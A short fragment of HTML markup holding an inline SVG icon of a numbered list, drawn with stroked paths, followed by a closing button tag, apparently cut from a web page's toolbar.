     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
   </button>
